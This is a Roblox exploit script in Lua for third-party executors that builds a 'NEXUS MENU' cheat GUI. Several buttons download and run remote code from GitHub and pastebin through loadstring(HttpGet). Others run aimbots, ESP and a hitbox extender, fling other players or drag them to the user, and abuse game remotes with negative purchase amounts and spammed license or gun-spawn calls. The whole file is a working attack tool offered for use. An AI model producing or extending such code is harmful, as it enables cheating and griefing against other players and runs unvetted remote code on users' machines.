-- ============ COMPLETE NEXUS MENU WITH ALL TABS FILLED ============
-- I-paste ito sa executor mo (Synapse X, Krnl, ScriptWare, etc.)

local Players = game:GetService("Players")
local TweenService = game:GetService("TweenService")
local UserInputService = game:GetService("UserInputService")
local RunService = game:GetService("RunService")
local player = Players.LocalPlayer
local playerGui = player:WaitForChild("PlayerGui")

local function new(class, props)
	local obj = Instance.new(class)
	if props then
		for k,v in pairs(props) do
			obj[k] = v
		end
	end
	return obj
end

local clickSound = Instance.new("Sound")
clickSound.SoundId = "rbxassetid://315416964"
clickSound.Volume = 0.5
clickSound.Parent = playerGui

local screenGui = new("ScreenGui", {
	Name = "NEXUS_GUI",
	ResetOnSpawn = false,
	Parent = playerGui,
	DisplayOrder = 1000,
})

-- FALLING WHITE DOTS
local particleContainer = new("Frame", {
	Parent = screenGui,
	Size = UDim2.new(1, 0, 1, 0),
	BackgroundTransparency = 1,
	Active = false,
})

local dots = {}
local DOT_COUNT = 50

for i = 1, DOT_COUNT do
	local dot = new("Frame", {
		Parent = particleContainer,
		Size = UDim2.new(0, math.random(2, 5), 0, math.random(2, 5)),
		Position = UDim2.new(math.random(), 0, math.random(), 0),
		BackgroundColor3 = Color3.fromRGB(255, 255, 255),
		BorderSizePixel = 0,
		BackgroundTransparency = 0.3,
	})
	new("UICorner", {CornerRadius = UDim.new(1, 0), Parent = dot})
	
	local speed = math.random(20, 60)
	local startX = dot.Position.X.Scale
	table.insert(dots, {dot, speed, startX})
end

task.spawn(function()
	while true do
		task.wait(0.05)
		for _, data in ipairs(dots) do
			local dot, speed, startX = data[1], data[2], data[3]
			local newY = dot.Position.Y.Scale + (speed / 10000)
			if newY > 1 then
				newY = 0
				dot.Position = UDim2.new(startX, 0, newY, 0)
			else
				dot.Position = UDim2.new(startX, 0, newY, 0)
			end
		end
	end
end)

-- MAIN FRAME
local main = new("Frame", {
	Name = "MainFrame",
	Size = UDim2.new(0, 600, 0, 450),
	Position = UDim2.new(0.5, -300, 0.5, -225),
	BackgroundColor3 = Color3.fromRGB(15, 15, 15),
	BorderSizePixel = 0,
	Parent = screenGui,
})
main.ClipsDescendants = true
new("UICorner", {CornerRadius = UDim.new(0, 12), Parent = main})

-- DRAGGABLE
local dragging, dragInput, dragStart, startPos
local function update(input)
	local delta = input.Position - dragStart
	main.Position = UDim2.new(startPos.X.Scale, startPos.X.Offset + delta.X,
		startPos.Y.Scale, startPos.Y.Offset + delta.Y)
end

main.InputBegan:Connect(function(input)
	if input.UserInputType == Enum.UserInputType.MouseButton1 or input.UserInputType == Enum.UserInputType.Touch then
		dragging = true
		dragStart = input.Position
		startPos = main.Position
		input.Changed:Connect(function()
			if input.UserInputState == Enum.UserInputState.End then
				dragging = false
			end
		end)
	end
end)

main.InputChanged:Connect(function(input)
	if input.UserInputType == Enum.UserInputType.MouseMovement or input.UserInputType == Enum.UserInputType.Touch then
		dragInput = input
	end
end)

UserInputService.InputChanged:Connect(function(input)
	if input == dragInput and dragging then
		update(input)
	end
end)

-- LEFT PANEL
local leftPanel = new("Frame", {
	Name = "LeftPanel",
	Size = UDim2.new(0, 160, 1, 0),
	BackgroundColor3 = Color3.fromRGB(20, 20, 20),
	BorderSizePixel = 0,
	Parent = main,
})
new("UICorner", {CornerRadius = UDim.new(0, 12), Parent = leftPanel})

new("TextLabel", {
	Parent = leftPanel,
	BackgroundTransparency = 1,
	Position = UDim2.new(0, 10, 0, 14),
	Size = UDim2.new(1, -20, 0, 28),
	Text = "NEXUS MENU V2",
	Font = Enum.Font.GothamBlack,
	TextSize = 18,
	TextColor3 = Color3.new(255, 255, 255),
	TextXAlignment = Enum.TextXAlignment.Left,
})

-- AVATAR
local avatarFrame = new("Frame", {
	Parent = leftPanel,
	BackgroundColor3 = Color3.fromRGB(30, 30, 30),
	Size = UDim2.new(0, 70, 0, 70),
	Position = UDim2.new(0.5, -35, 0, 50),
	BorderSizePixel = 0,
	ClipsDescendants = true,
})
local ring = new("Frame", {Parent = avatarFrame, Size = UDim2.new(1,0,1,0), BackgroundColor3 = Color3.fromRGB(80,80,80), BorderSizePixel = 0})
new("UICorner", {CornerRadius = UDim.new(1,0), Parent = ring})
local inner = new("Frame", {Parent = ring, Size = UDim2.new(0.86,0,0.86,0), Position = UDim2.new(0.07,0,0.07,0), BackgroundColor3 = Color3.fromRGB(15,15,15), BorderSizePixel = 0})
new("UICorner", {CornerRadius = UDim.new(1,0), Parent = inner})
local avatar = new("ImageLabel", {Parent = inner, BackgroundTransparency = 1, Size = UDim2.new(1,0,1,0), Image = Players:GetUserThumbnailAsync(player.UserId, Enum.ThumbnailType.HeadShot, Enum.ThumbnailSize.Size150x150)})
new("UICorner", {CornerRadius = UDim.new(1,0), Parent = avatar})

new("TextLabel", {Parent = leftPanel, BackgroundTransparency = 1, Position = UDim2.new(0,0,0,130), Size = UDim2.new(1,0,0,20), Text = player.DisplayName, Font = Enum.Font.GothamBold, TextSize = 13, TextColor3 = Color3.new(255,255,255), TextXAlignment = Enum.TextXAlignment.Center})
new("TextLabel", {Parent = leftPanel, BackgroundTransparency = 1, Position = UDim2.new(0,0,0,150), Size = UDim2.new(1,0,0,16), Text = "@" .. player.Name, Font = Enum.Font.Gotham, TextSize = 10, TextColor3 = Color3.fromRGB(150,150,150), TextXAlignment = Enum.TextXAlignment.Center})

new("TextLabel", {Parent = leftPanel, BackgroundTransparency = 1, Position = UDim2.new(0,0,0,195), Size = UDim2.new(1,0,0,80), Text = "NEXUS\n\nDiscord: nexus\n\nTiktok: nexus", Font = Enum.Font.Gotham, TextSize = 10, TextColor3 = Color3.fromRGB(150,150,150), TextXAlignment = Enum.TextXAlignment.Center, TextYAlignment = Enum.TextYAlignment.Top, TextWrapped = true})

-- RIGHT PANEL
local rightPanel = new("Frame", {
	Name = "RightPanel",
	Parent = main,
	Size = UDim2.new(1, -160, 1, -45),
	Position = UDim2.new(0, 160, 0, 0),
	BackgroundColor3 = Color3.fromRGB(15, 15, 15),
	BorderSizePixel = 0,
})
new("UICorner", {CornerRadius = UDim.new(0, 12), Parent = rightPanel})

local titleLabel = new("TextLabel", {
	Parent = rightPanel,
	Position = UDim2.new(0, 12, 0, 8),
	Size = UDim2.new(1, -24, 0, 25),
	BackgroundTransparency = 1,
	Text = "MAIN MENU",
	Font = Enum.Font.GothamBold,
	TextSize = 16,
	TextColor3 = Color3.new(255,255,255),
	TextXAlignment = Enum.TextXAlignment.Left,
})

-- TAB BAR
local tabBar = new("ScrollingFrame", {
	Parent = rightPanel,
	Position = UDim2.new(0, 12, 0, 38),
	Size = UDim2.new(1, -24, 0, 34),
	BackgroundColor3 = Color3.fromRGB(22,22,22),
	BorderSizePixel = 0,
	ScrollBarThickness = 4,
	ScrollBarImageColor3 = Color3.fromRGB(80,80,80),
	CanvasSize = UDim2.new(0,0,0,0),
	ScrollingDirection = Enum.ScrollingDirection.X,
	AutomaticCanvasSize = Enum.AutomaticSize.X,
})
new("UICorner", {CornerRadius = UDim.new(0,6), Parent = tabBar})
local tabLayout = new("UIListLayout", {Parent = tabBar, FillDirection = Enum.FillDirection.Horizontal, Padding = UDim.new(0,6), SortOrder = Enum.SortOrder.LayoutOrder})

local contentArea = new("Frame", {
	Parent = rightPanel,
	Position = UDim2.new(0, 12, 0, 78),
	Size = UDim2.new(1, -24, 1, -120),
	BackgroundTransparency = 1,
	ClipsDescendants = true,
})

local bottomBar = new("Frame", {
	Parent = main,
	Position = UDim2.new(0, 160, 1, -40),
	Size = UDim2.new(1, -160, 0, 40),
	BackgroundColor3 = Color3.fromRGB(20,20,20),
	BorderSizePixel = 0,
})
new("UICorner", {CornerRadius = UDim.new(0,12), Parent = bottomBar})

-- TABS
local allTabButtons = {}
local allTabPanels = {}
local currentTab = "MAIN MENU"

local function showTab(name)
	if currentTab == name then return end
	if currentTab and allTabPanels[currentTab] then
		allTabPanels[currentTab].Visible = false
	end
	currentTab = name
	if allTabPanels[name] then
		allTabPanels[name].Visible = true
	end
	titleLabel.Text = name
end

-- TOP TABS
local topTabNames = {
	"MAIN MENU", "ROLEPLAY", "BRING", "AIMBOT",
	"SCRIPT", "CASH", "PLAYER", "NEXUS",
	"BILLIONARE", "RP TP", "ADMIN", "REMOTES"
}

local function createTopTab(name)
	local btn = new("TextButton", {
		Parent = tabBar,
		Size = UDim2.new(0, 80, 1, -8),
		BackgroundColor3 = Color3.fromRGB(28,28,28),
		Text = name,
		Font = Enum.Font.GothamSemibold,
		TextSize = 10,
		TextColor3 = Color3.new(255,255,255),
		AutoButtonColor = false,
	})
	new("UICorner", {CornerRadius = UDim.new(0,4), Parent = btn})
	btn.MouseEnter:Connect(function() if currentTab ~= name then TweenService:Create(btn, TweenInfo.new(0.15), {BackgroundColor3 = Color3.fromRGB(45,45,45)}):Play() end end)
	btn.MouseLeave:Connect(function() if currentTab ~= name then TweenService:Create(btn, TweenInfo.new(0.15), {BackgroundColor3 = Color3.fromRGB(28,28,28)}):Play() end end)
	btn.MouseButton1Click:Connect(function() clickSound:Play(); showTab(name) end)
	
	local panel = new("ScrollingFrame", {Parent = contentArea, Size = UDim2.new(1,0,1,0), BackgroundTransparency = 1, Visible = false, ScrollBarThickness = 4, ScrollBarImageColor3 = Color3.fromRGB(80,80,80), AutomaticCanvasSize = Enum.AutomaticSize.Y})
	new("UIListLayout", {Parent = panel, Padding = UDim.new(0,6)})
	allTabPanels[name] = panel
	table.insert(allTabButtons, btn)
	return panel
end

for _, name in ipairs(topTabNames) do createTopTab(name) end

-- BOTTOM TABS
local bottomTabs = {"PLAYER LIST", "SETTINGS", "EXECUTOR"}
local function createBottomTab(name)
	local btn = new("TextButton", {
		Parent = bottomBar,
		Size = UDim2.new(0, 90, 1, -10),
		BackgroundColor3 = Color3.fromRGB(28,28,28),
		Text = name,
		Font = Enum.Font.GothamSemibold,
		TextSize = 11,
		TextColor3 = Color3.new(255,255,255),
		AutoButtonColor = false,
	})
	new("UICorner", {CornerRadius = UDim.new(0,4), Parent = btn})
	local function positionButton()
		local totalWidth = #bottomTabs * 90 + (#bottomTabs-1) * 10
		local startX = (bottomBar.AbsoluteSize.X - totalWidth) / 2
		btn.Position = UDim2.new(0, startX + (table.find(bottomTabs, name)-1)*(90+10), 0, 5)
	end
	task.delay(0, positionButton)
	bottomBar:GetPropertyChangedSignal("AbsoluteSize"):Connect(positionButton)
	btn.MouseButton1Click:Connect(function() clickSound:Play(); showTab(name) end)
	
	local panel = new("ScrollingFrame", {Parent = contentArea, Size = UDim2.new(1,0,1,0), BackgroundTransparency = 1, Visible = false, ScrollBarThickness = 4, ScrollBarImageColor3 = Color3.fromRGB(80,80,80), AutomaticCanvasSize = Enum.AutomaticSize.Y})
	new("UIListLayout", {Parent = panel, Padding = UDim.new(0,6)})
	allTabPanels[name] = panel
	table.insert(allTabButtons, btn)
	return panel
end
for _, name in ipairs(bottomTabs) do createBottomTab(name) end

if allTabButtons[1] then allTabButtons[1].BackgroundColor3 = Color3.fromRGB(55,55,55) end
showTab("MAIN MENU")

-- BUTTON CREATOR
local function addButton(panel, text, callback)
	if not panel then return end
	local btn = new("TextButton", {
		Size = UDim2.new(1, -12, 0, 34),
		BackgroundColor3 = Color3.fromRGB(28,28,28),
		TextColor3 = Color3.new(255,255,255),
		Font = Enum.Font.GothamSemibold,
		TextSize = 12,
		Text = text,
		AutoButtonColor = false,
		Parent = panel,
	})
	new("UICorner", {CornerRadius = UDim.new(0,4), Parent = btn})
	btn.MouseEnter:Connect(function() TweenService:Create(btn, TweenInfo.new(0.15), {BackgroundColor3 = Color3.fromRGB(45,45,45)}):Play() end)
	btn.MouseLeave:Connect(function() TweenService:Create(btn, TweenInfo.new(0.15), {BackgroundColor3 = Color3.fromRGB(28,28,28)}):Play() end)
	btn.MouseButton1Click:Connect(function() clickSound:Play(); callback() end)
end

-- ============ MAIN MENU BUTTONS ============
local mainPanel = allTabPanels["MAIN MENU"]
addButton(mainPanel, "INFINITE YIELD", function() loadstring(game:HttpGet("https://raw.githubusercontent.com/EdgeIY/infiniteyield/master/source"))() end)
addButton(mainPanel, "MUSIC EXPLOITS", function() loadstring(game:HttpGet("https://raw.githubusercontent.com/NighterEpic/Music-Exploits/main/music.lua"))() end)
addButton(mainPanel, "ESP PLAYER", function()
	local ESP_ENABLED = true
	local gui = Instance.new("ScreenGui", playerGui)
	local toggle = Instance.new("TextButton", gui)
	toggle.Size = UDim2.new(0,100,0,35)
	toggle.Position = UDim2.new(0,20,0,120)
	toggle.BackgroundColor3 = Color3.fromRGB(30,30,30)
	toggle.TextColor3 = Color3.new(255,255,255)
	toggle.Text = "ESP: ON"
	toggle.Font = Enum.Font.GothamBold
	toggle.TextSize = 14
	Instance.new("UICorner", toggle).CornerRadius = UDim.new(0,6)
	toggle.MouseButton1Click:Connect(function() ESP_ENABLED = not ESP_ENABLED; toggle.Text = ESP_ENABLED and "ESP: ON" or "ESP: OFF" end)
	RunService.RenderStepped:Connect(function()
		if not ESP_ENABLED then return end
		for _, plr in pairs(Players:GetPlayers()) do
			if plr ~= player and plr.Character and plr.Character:FindFirstChild("Head") then
				local head = plr.Character.Head
				local pos, onScreen = workspace.CurrentCamera:WorldToViewportPoint(head.Position)
				if onScreen then
					local text = Drawing.new("Text")
					text.Text = plr.Name
					text.Position = Vector2.new(pos.X, pos.Y - 20)
					text.Size = 14
					text.Color = Color3.new(255,255,255)
					text.Center = true
					text.Outline = true
					text.Visible = true
					task.wait(0.1)
					text:Remove()
				end
			end
		end
	end)
end)
addButton(mainPanel, "BIG HEAD", function()
	_G.HeadSize = 6
	_G.Disabled = true
	RunService.RenderStepped:connect(function()
		if _G.Disabled then
			for _,v in pairs(Players:GetPlayers()) do
				if v ~= player and v.Character and v.Character:FindFirstChild("Head") then
					v.Character.Head.Size = Vector3.new(_G.HeadSize,_G.HeadSize,_G.HeadSize)
					v.Character.Head.Transparency = 0.4
					v.Character.Head.BrickColor = BrickColor.new("Red")
					v.Character.Head.Material = "Neon"
				end
			end
		end
	end)
end)
addButton(mainPanel, "FREECAM (Q)", function()
	local enabled = false
	local cam = workspace.CurrentCamera
	local moveDir = Vector3.new()
	local yaw, pitch = 0, 0
	UserInputService.InputBegan:Connect(function(i)
		if i.KeyCode == Enum.KeyCode.Q then
			enabled = not enabled
			cam.CameraType = enabled and Enum.CameraType.Scriptable or Enum.CameraType.Custom
			UserInputService.MouseBehavior = enabled and Enum.MouseBehavior.LockCenter or Enum.MouseBehavior.Default
			UserInputService.MouseIconEnabled = not enabled
		end
		if enabled and i.UserInputType == Enum.UserInputType.Keyboard then
			if i.KeyCode == Enum.KeyCode.W then moveDir += Vector3.new(0,0,1) end
			if i.KeyCode == Enum.KeyCode.S then moveDir += Vector3.new(0,0,-1) end
			if i.KeyCode == Enum.KeyCode.A then moveDir += Vector3.new(-1,0,0) end
			if i.KeyCode == Enum.KeyCode.D then moveDir += Vector3.new(1,0,0) end
			if i.KeyCode == Enum.KeyCode.Space then moveDir += Vector3.new(0,1,0) end
			if i.KeyCode == Enum.KeyCode.LeftControl then moveDir += Vector3.new(0,-1,0) end
		end
	end)
	UserInputService.InputEnded:Connect(function(i)
		if enabled and i.UserInputType == Enum.UserInputType.Keyboard then
			if i.KeyCode == Enum.KeyCode.W then moveDir -= Vector3.new(0,0,1) end
			if i.KeyCode == Enum.KeyCode.S then moveDir -= Vector3.new(0,0,-1) end
			if i.KeyCode == Enum.KeyCode.A then moveDir -= Vector3.new(-1,0,0) end
			if i.KeyCode == Enum.KeyCode.D then moveDir -= Vector3.new(1,0,0) end
			if i.KeyCode == Enum.KeyCode.Space then moveDir -= Vector3.new(0,1,0) end
			if i.KeyCode == Enum.KeyCode.LeftControl then moveDir -= Vector3.new(0,-1,0) end
		end
	end)
	UserInputService.InputChanged:Connect(function(i)
		if enabled and i.UserInputType == Enum.UserInputType.MouseMovement then
			yaw = yaw - i.Delta.X * 0.15
			pitch = math.clamp(pitch - i.Delta.Y * 0.15, -89, 89)
		end
	end)
	RunService.RenderStepped:Connect(function(dt)
		if not enabled then return end
		local speed = 60
		local newPos = cam.CFrame.Position + (cam.CFrame.RightVector * moveDir.X + cam.CFrame.UpVector * moveDir.Y + cam.CFrame.LookVector * moveDir.Z) * speed * dt
		cam.CFrame = CFrame.new(newPos) * CFrame.Angles(math.rad(pitch), math.rad(yaw), 0)
	end)
end)
addButton(mainPanel, "AIMBOT", function()
	local Circle = Drawing.new("Circle")
	Circle.Thickness = 2
	Circle.Color = Color3.new(255,255,255)
	Circle.Radius = 150
	RunService.RenderStepped:Connect(function()
		Circle.Position = UserInputService:GetMouseLocation()
		local closest, dist = nil, 150
		for _, plr in pairs(Players:GetPlayers()) do
			if plr ~= player and plr.Character and plr.Character:FindFirstChild("Head") then
				local pos, on = workspace.CurrentCamera:WorldToViewportPoint(plr.Character.Head.Position)
				if on then
					local mag = (Vector2.new(pos.X, pos.Y) - UserInputService:GetMouseLocation()).Magnitude
					if mag < dist then closest, dist = plr, mag end
				end
			end
		end
		if closest and UserInputService:IsMouseButtonPressed(Enum.UserInputType.MouseButton2) then
			workspace.CurrentCamera.CFrame = CFrame.new(workspace.CurrentCamera.CFrame.Position, closest.Character.Head.Position)
		end
	end)
end)
addButton(mainPanel, "FADED GUI", function() loadstring(game:HttpGet("https://raw.githubusercontent.com/NighterEpic/Faded-Grid/main/YesEpic", true))() end)
addButton(mainPanel, "HITBOX EXTENDER", function() loadstring(game:HttpGet("https://raw.githubusercontent.com/LisSploit/HitBoxExtender/main/Universal",true))() end)
addButton(mainPanel, "FLING ALL", function()
	for _, plr in pairs(Players:GetPlayers()) do
		if plr ~= player and plr.Character and plr.Character:FindFirstChild("HumanoidRootPart") then
			plr.Character.HumanoidRootPart.Velocity = Vector3.new(9e7, 9e7, 9e7)
		end
	end
end)
addButton(mainPanel, "GIVE ALL CASH 10M", function()
	for _, plr in pairs(Players:GetPlayers()) do
		local cash = plr:FindFirstChild("leaderstats") and plr.leaderstats:FindFirstChild("Cash")
		if cash then cash.Value = cash.Value + 10000000 end
	end
end)
addButton(mainPanel, "NO FALL DAMAGE", function()
	player.CharacterAdded:Connect(function(char)
		char:WaitForChild("Humanoid").MaxHealth = math.huge
		char.Humanoid.Health = math.huge
	end)
	if player.Character and player.Character:FindFirstChild("Humanoid") then
		player.Character.Humanoid.MaxHealth = math.huge
		player.Character.Humanoid.Health = math.huge
	end
end)

-- ============ ROLEPLAY MENU BUTTONS ============
local roleplayPanel = allTabPanels["ROLEPLAY"]
addButton(roleplayPanel, "STORAGE SYSTEM VIEWER", function()
	local storageSystem = game.ReplicatedStorage:FindFirstChild("StorageSystem")
	if storageSystem then
		local gui = Instance.new("ScreenGui", playerGui)
		local frame = Instance.new("Frame", gui)
		frame.Size = UDim2.new(0,400,0,400)
		frame.Position = UDim2.new(0.5,-200,0.5,-200)
		frame.BackgroundColor3 = Color3.fromRGB(20,20,20)
		Instance.new("UICorner", frame).CornerRadius = UDim.new(0,10)
		local scroll = Instance.new("ScrollingFrame", frame)
		scroll.Size = UDim2.new(1,-10,1,-40)
		scroll.Position = UDim2.new(0,5,0,35)
		scroll.BackgroundTransparency = 1
		local layout = Instance.new("UIListLayout", scroll)
		for _, tool in pairs(storageSystem:GetDescendants()) do
			if tool:IsA("Tool") then
				local btn = Instance.new("TextButton", scroll)
				btn.Size = UDim2.new(1,-10,0,30)
				btn.Text = tool.Name
				btn.BackgroundColor3 = Color3.fromRGB(30,30,30)
				btn.TextColor3 = Color3.new(255,255,255)
			end
		end
	end
end)
addButton(roleplayPanel, "BUYITEM REMOTE", function()
	local buyRemote = game.ReplicatedStorage:FindFirstChild("BuyItemRemote")
	local gui = Instance.new("ScreenGui", playerGui)
	local frame = Instance.new("Frame", gui)
	frame.Size = UDim2.new(0,300,0,200)
	frame.Position = UDim2.new(0.5,-150,0.5,-100)
	frame.BackgroundColor3 = Color3.fromRGB(20,20,20)
	Instance.new("UICorner", frame).CornerRadius = UDim.new(0,10)
	local itemBox = Instance.new("TextBox", frame)
	itemBox.Size = UDim2.new(1,-20,0,35)
	itemBox.Position = UDim2.new(0,10,0,50)
	itemBox.PlaceholderText = "Item Name"
	itemBox.BackgroundColor3 = Color3.fromRGB(30,30,30)
	itemBox.TextColor3 = Color3.new(255,255,255)
	local amountBox = Instance.new("TextBox", frame)
	amountBox.Size = UDim2.new(1,-20,0,35)
	amountBox.Position = UDim2.new(0,10,0,95)
	amountBox.PlaceholderText = "Amount"
	amountBox.BackgroundColor3 = Color3.fromRGB(30,30,30)
	amountBox.TextColor3 = Color3.new(255,255,255)
	local buyBtn = Instance.new("TextButton", frame)
	buyBtn.Size = UDim2.new(1,-20,0,40)
	buyBtn.Position = UDim2.new(0,10,0,145)
	buyBtn.Text = "BUY"
	buyBtn.BackgroundColor3 = Color3.fromRGB(30,30,30)
	buyBtn.TextColor3 = Color3.new(255,255,255)
	buyBtn.MouseButton1Click:Connect(function()
		if buyRemote and itemBox.Text ~= "" then
			buyRemote:FireServer(itemBox.Text, tonumber(amountBox.Text) or -1)
		end
	end)
end)
addButton(roleplayPanel, "GUNSHOP REMOTE", function()
	local purchase = game.ReplicatedStorage:FindFirstChild("GunShop") and game.ReplicatedStorage.GunShop:FindFirstChild("Events") and game.ReplicatedStorage.GunShop.Events:FindFirstChild("Purchase")
	local gui = Instance.new("ScreenGui", playerGui)
	local frame = Instance.new("Frame", gui)
	frame.Size = UDim2.new(0,300,0,200)
	frame.Position = UDim2.new(0.5,-150,0.5,-100)
	frame.BackgroundColor3 = Color3.fromRGB(20,20,20)
	Instance.new("UICorner", frame).CornerRadius = UDim.new(0,10)
	local itemBox = Instance.new("TextBox", frame)
	itemBox.Size = UDim2.new(1,-20,0,35)
	itemBox.Position = UDim2.new(0,10,0,50)
	itemBox.PlaceholderText = "Item Name"
	itemBox.BackgroundColor3 = Color3.fromRGB(30,30,30)
	itemBox.TextColor3 = Color3.new(255,255,255)
	local amountBox = Instance.new("TextBox", frame)
	amountBox.Size = UDim2.new(1,-20,0,35)
	amountBox.Position = UDim2.new(0,10,0,95)
	amountBox.PlaceholderText = "Amount (negative)"
	amountBox.BackgroundColor3 = Color3.fromRGB(30,30,30)
	amountBox.TextColor3 = Color3.new(255,255,255)
	local buyBtn = Instance.new("TextButton", frame)
	buyBtn.Size = UDim2.new(1,-20,0,40)
	buyBtn.Position = UDim2.new(0,10,0,145)
	buyBtn.Text = "BUY"
	buyBtn.BackgroundColor3 = Color3.fromRGB(30,30,30)
	buyBtn.TextColor3 = Color3.new(255,255,255)
	buyBtn.MouseButton1Click:Connect(function()
		if purchase and itemBox.Text ~= "" then
			purchase:FireServer(itemBox.Text, tonumber(amountBox.Text) or -1)
		end
	end)
end)
addButton(roleplayPanel, "LICENSE GIVER", function()
	while true do
		local license = game.ReplicatedStorage:FindFirstChild("GunLicenseGiver")
		if license then license:FireServer("User", 0.1) end
		task.wait()
	end
end)
addButton(roleplayPanel, "SPAWN GUN", function()
	local remote = game.ReplicatedStorage:FindFirstChild("GivePistolBox") or game.ReplicatedStorage:FindFirstChild("BuyToolEvent")
	if remote then
		remote:FireServer("AK-47", -1)
	end
end)

-- ============ BRING MENU BUTTONS ============
local bringPanel = allTabPanels["BRING"]
addButton(bringPanel, "BRING ALL (CARRY)", function()
	local carryRemote = game.ReplicatedStorage:FindFirstChild("CarryReplic") and game.ReplicatedStorage.CarryReplic:FindFirstChild("CarryRemotes") and game.ReplicatedStorage.CarryReplic.CarryRemotes:FindFirstChild("CarryRemote")
	local carryChoice = game.ReplicatedStorage:FindFirstChild("CarryReplic") and game.ReplicatedStorage.CarryReplic:FindFirstChild("CarryChoices") and game.ReplicatedStorage.CarryReplic.CarryChoices:FindFirstChild("Couple Hug")
	if carryRemote and carryChoice then
		for _, plr in pairs(Players:GetPlayers()) do
			if plr ~= player then
				carryRemote:FireServer({cmd = "Carry", carrychoicesss = carryChoice, firstPlr = plr})
			end
		end
		task.wait(0.1)
		carryRemote:FireServer({cmd = "Declinecarry"})
	end
end)
addButton(bringPanel, "BRING RANDOM", function()
	local carryRemote = game.ReplicatedStorage:FindFirstChild("CarryReplic") and game.ReplicatedStorage.CarryReplic:FindFirstChild("CarryRemotes") and game.ReplicatedStorage.CarryReplic.CarryRemotes:FindFirstChild("CarryRemote")
	local carryChoice = game.ReplicatedStorage:FindFirstChild("CarryReplic") and game.ReplicatedStorage.CarryReplic:FindFirstChild("CarryChoices") and game.ReplicatedStorage.CarryReplic.CarryChoices:FindFirstChild("Couple Hug")
	if carryRemote and carryChoice then
		local others = {}
		for _, plr in pairs(Players:GetPlayers()) do if plr ~= player then table.insert(others, plr) end end
		if #others > 0 then
			carryRemote:FireServer({cmd = "Carry", carrychoicesss = carryChoice, firstPlr = others[math.random(#others)]})
			task.wait(0.1)
			carryRemote:FireServer({cmd = "Declinecarry"})
		end
	end
end)
addButton(bringPanel, "LOOP BRING", function()
	local loopEnabled = false
	local gui = Instance.new("ScreenGui", game.CoreGui)
	local frame = Instance.new("Frame", gui)
	frame.Size = UDim2.new(0,250,0,80)
	frame.Position = UDim2.new(0.5,-125,0,50)
	frame.BackgroundColor3 = Color3.fromRGB(20,20,20)
	Instance.new("UICorner", frame).CornerRadius = UDim.new(0,6)
	local btn = Instance.new("TextButton", frame)
	btn.Size = UDim2.new(1,0,1,-10)
	btn.Position = UDim2.new(0,0,0,5)
	btn.Text = "OFF"
	btn.BackgroundColor3 = Color3.fromRGB(30,30,30)
	btn.TextColor3 = Color3.new(255,255,255)
	btn.MouseButton1Click:Connect(function()
		loopEnabled = not loopEnabled
		btn.Text = loopEnabled and "ON" or "OFF"
	end)
	RunService.RenderStepped:Connect(function()
		if loopEnabled and player.Character and player.Character:FindFirstChild("HumanoidRootPart") then
			local targetPos = player.Character.HumanoidRootPart.Position + (player.Character.HumanoidRootPart.CFrame.LookVector * 5)
			for _, plr in pairs(Players:GetPlayers()) do
				if plr ~= player and plr.Character and plr.Character:FindFirstChild("HumanoidRootPart") then
					plr.Character.HumanoidRootPart.CFrame = CFrame.new(targetPos)
				end
			end
		end
	end)
end)

-- ============ AIMBOT MENU BUTTONS ============
local aimbotPanel = allTabPanels["AIMBOT"]
addButton(aimbotPanel, "AIMBOT V2", function()
	local enabled = false
	local fov = 150
	local Circle = Drawing.new("Circle")
	Circle.Thickness = 2
	Circle.Color = Color3.new(255,255,255)
	Circle.Radius = fov
	local gui = Instance.new("ScreenGui", game.CoreGui)
	local frame = Instance.new("Frame", gui)
	frame.Size = UDim2.new(0,200,0,100)
	frame.Position = UDim2.new(0,10,0,10)
	frame.BackgroundColor3 = Color3.fromRGB(20,20,20)
	Instance.new("UICorner", frame).CornerRadius = UDim.new(0,8)
	local toggle = Instance.new("TextButton", frame)
	toggle.Size = UDim2.new(1,-10,0,30)
	toggle.Position = UDim2.new(0,5,0,10)
	toggle.Text = "AIMBOT: OFF"
	toggle.BackgroundColor3 = Color3.fromRGB(30,30,30)
	toggle.TextColor3 = Color3.new(255,255,255)
	toggle.MouseButton1Click:Connect(function()
		enabled = not enabled
		toggle.Text = enabled and "AIMBOT: ON" or "AIMBOT: OFF"
	end)
	local slider = Instance.new("TextButton", frame)
	slider.Size = UDim2.new(1,-10,0,30)
	slider.Position = UDim2.new(0,5,0,50)
	slider.Text = "FOV: " .. fov
	slider.BackgroundColor3 = Color3.fromRGB(30,30,30)
	slider.TextColor3 = Color3.new(255,255,255)
	local dragging = false
	slider.MouseButton1Down:Connect(function() dragging = true end)
	UserInputService.InputEnded:Connect(function(i) if i.UserInputType == Enum.UserInputType.MouseButton1 then dragging = false end end)
	UserInputService.InputChanged:Connect(function(i)
		if dragging and i.UserInputType == Enum.UserInputType.MouseMovement then
			local percent = math.clamp((i.Position.X - slider.AbsolutePosition.X) / slider.AbsoluteSize.X, 0, 1)
			fov = math.floor(50 + percent * 400)
			Circle.Radius = fov
			slider.Text = "FOV: " .. fov
		end
	end)
	RunService.RenderStepped:Connect(function()
		Circle.Visible = enabled
		Circle.Position = UserInputService:GetMouseLocation()
		if enabled and UserInputService:IsMouseButtonPressed(Enum.UserInputType.MouseButton2) then
			local closest, dist = nil, fov
			for _, plr in pairs(Players:GetPlayers()) do
				if plr ~= player and plr.Character and plr.Character:FindFirstChild("Head") then
					local pos, on = workspace.CurrentCamera:WorldToViewportPoint(plr.Character.Head.Position)
					if on then
						local mag = (Vector2.new(pos.X, pos.Y) - UserInputService:GetMouseLocation()).Magnitude
						if mag < dist then closest, dist = plr, mag end
					end
				end
			end
			if closest then
				workspace.CurrentCamera.CFrame = CFrame.new(workspace.CurrentCamera.CFrame.Position, closest.Character.Head.Position)
			end
		end
	end)
end)
addButton(aimbotPanel, "MOBILE AIMBOT", function()
	local enabled = false
	UserInputService.InputBegan:Connect(function(i, gp)
		if not gp and i.UserInputType == Enum.UserInputType.Touch then
			enabled = not enabled
		end
	end)
	RunService.RenderStepped:Connect(function()
		if not enabled then return end
		local closest, dist = nil, 300
		for _, plr in pairs(Players:GetPlayers()) do
			if plr ~= player and plr.Character and plr.Character:FindFirstChild("Head") then
				local pos, on = workspace.CurrentCamera:WorldToViewportPoint(plr.Character.Head.Position)
				if on then
					local center = workspace.CurrentCamera.ViewportSize / 2
					local mag = (Vector2.new(pos.X, pos.Y) - center).Magnitude
					if mag < dist then closest, dist = plr, mag end
				end
			end
		end
		if closest then
			workspace.CurrentCamera.CFrame = CFrame.new(workspace.CurrentCamera.CFrame.Position, closest.Character.Head.Position)
		end
	end)
end)

-- ============ SCRIPT MENU BUTTONS ============
local scriptPanel = allTabPanels["SCRIPT"]
addButton(scriptPanel, "BACKDOOR SCANNER", function() loadstring(game:HttpGet("https://pastebin.com/raw/inks0adx",true))() end)
